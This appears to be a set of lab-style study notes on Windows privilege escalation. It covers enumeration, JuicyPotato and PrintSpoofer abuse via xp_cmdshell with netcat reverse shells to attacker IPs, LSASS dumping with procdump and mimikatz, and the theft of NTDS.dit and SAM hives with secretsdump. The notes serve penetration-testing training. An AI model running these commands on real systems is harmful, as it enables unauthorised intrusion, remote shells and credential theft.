# Windows privilege escalation

## Situational Awareness

### Network info

Interesting commands to check to which other hosts our box under attack communicates with:
```
#Check interfaces to see to which network it connects
ipconfig
#Recent IP addresses our box has communicated with
arp -a
#Routing table
route print
```

### Enumerating Protections (Anti-Virus/EDR)

Check for an active windows defender:
```
Get-MpComputerStatus
```

Applocker rules:
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Test a certain binary to see if it has Applocker policies applicable to it:
```
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

## Initial Enumeration

We can use tasklist to enumerate what services are running on the box:
```
tasklist /svc
```
Dump all the env variables:
```
set
```

Other usefull info such as installed KB's and so on can be obtained with the following command:
```
systeminfo
#OR
wmic qfe
#OR
Get-HotFix | ft -AutoSize
```

Get list of installed programs:
```
#With cmd
wmic product get name
#With powershell
Get-WmiObject -Class Win32_Product |  select Name, Version
```

Get listening ports on the box:
```
netstat -ano
```

Check for logged in users:
```
query user
```

Check privileges of our user:
```
whoami /priv
```
Check the groups the user is member of:
```
whoami /groups
```

Check other accounts which exist on the box:
```
net user
```

Check all the groups which exists on the host:
```
net localgroup
```

Check which users are in the `administrator` group:
```
net localgroup administrators
```

Get password policy:
```
net accounts
```

## Communication with Processes

One of the best places to look for privilege escalation is the processes that are running on the system. Even if a process is not running as an administrator, it may lead to additional privileges. The most common example is discovering a web server like IIS or XAMPP running on the box, placing an aspx/php shell on the box, and gaining a shell as the user running the web server. Generally, this is not an administrator but will often have the SeImpersonate token, allowing for Rogue/Juicy/Lonely Potato to provide SYSTEM permissions.

We could escalate priviliges from a process listening on a socket only available to the loopback adapter.. We can check if such processes exist:
```
netstat -ano
```

Communication between processes on Windows can also happen with pipes.
```
#List all pipes (sys internal tools)
pipelist.exe /accepteula
#Or in powershell
gci \\.\pipe\
#Enumerate permissions different groups have over the pipe
accesschk.exe /accepteula \\.\Pipe\lsass -v
```
## Windows Privileges Overview

pass

## SeImpersonate and SeAssignPrimaryToken

When we reach code execution on a windows server (IIS or SQL server) we can possibly 
elevate privileges by using the `SeImpersonate`privilege. Bascially it allows a connecting client hand over it privileges to the server. Normally this is used to have the server access resources only accessible to the client (file share for instance)

The JuicyPotato example:
Connect to a sql server (say we have obtained some secrets)

```
impacket-mssqlclient sql_dev@10.129.43.43 -windows-auth
```
Once connected enable `xp_cmdshell` allowing us to execute commands in the SQL query:
```
enable_xp_cmdshell
xp_cmdshell whoami
#Check privileges
xp_cmdshell whoami /priv
```

We see we have the `SeImpersonatePrivilege` privilege.
Next we can use JuicyPotato:

Setup a listener:
```
sudo nc -lnvp 8443
```

```
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.78 8443 -e cmd.exe" -t *
```
Basically this is spawning some DCOM process where a high privileged service (BITS Background Intelligent Transfer Service) is tricked in authentication against its DCOM server.. JuicyPotato intercepts and redirects this request and spawns a new process with these priviles:


JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, PrintSpoofer and RoguePotato can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access. This blog post goes in-depth on the PrintSpoofer tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

Let's try PrintSpoofer:
Set up a listener:
```
nc -lnvp 8443
```
Then execute:
```
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

We have a remote shell as the NT system user

## SeDebugPrivilege

If we have this privilege we are able to for instance dump the secret hashes from LSASS:
```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

After the dump we can use mimikatz to fetch the hashes and crack them or do Pass-the-hash attacks:
```
mimikatz.exe
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

Alternatively we can use this privilege to create a child process from another high privileged process.
See the poc here: https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1

We can use it like this:
```
[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```
First we need to look for the PID of a high privileged process:
```
tasklist


Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```
For instance here we can use winlogin... Next run the script like this:
```
[MyProcess]::CreateProcessFromParent(612,C:\Windows\System32\cmd.exe,"")
```

## SeTakeOwnershipPrivilege

When we have this privilege we can become owner of any securable object:
```
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```
We see in this case it is `Disabled`.  We can enable it using this script: https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1

Use the script like this:
```
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

Now the privilege is enabled.
Lets use it... ! 

Say there is a file we cannot read...
```
#First take ownership of the file:
takeown /f 'C:\Departmenttake Shares\Private\IT\cred.txt'
#Then change the dacl to allow our user to read it
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
#Now read it
cat 'C:\Department Shares\Private\IT\cred.txt'
```

## Windows Built-in Groups

In case our user has the `SeBackupPrivilege' it can basically copy any file.. Even if our user does not have any ACE entry to do so...
We do have too use a special script ( https://github.com/giuliano108/SeBackupPrivilege )
```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
If the privilege is disabled we can enable it with:
```
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

Now we can copy any file:
```
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

We can also steal the NTDS.dit file from the domain controller like this.
First create a shadow copy of the C-drive:
```
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

Then copy the `NTDS.dit` file from the shadow copy: 
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatively we can use robocopy:
```
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

Once obtained we can use secretsdump to get the hashes or alternatively DSInternals:
```
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

we can also copy the registry hives and extraxt local account credentials (`secretsdump.py`):
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

We can use `secretsdump` to obtain the hashes:
```
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

## Windows Privilege Escalation   

If auditing of process command lines is enabled sensitive information will be stored in logs which we can retrieve with:
```
wevtutil qe Security /rd:true /f:text | Select-String "/user"
OR
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

We can also search security logs captured by WinEvent:
```
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```





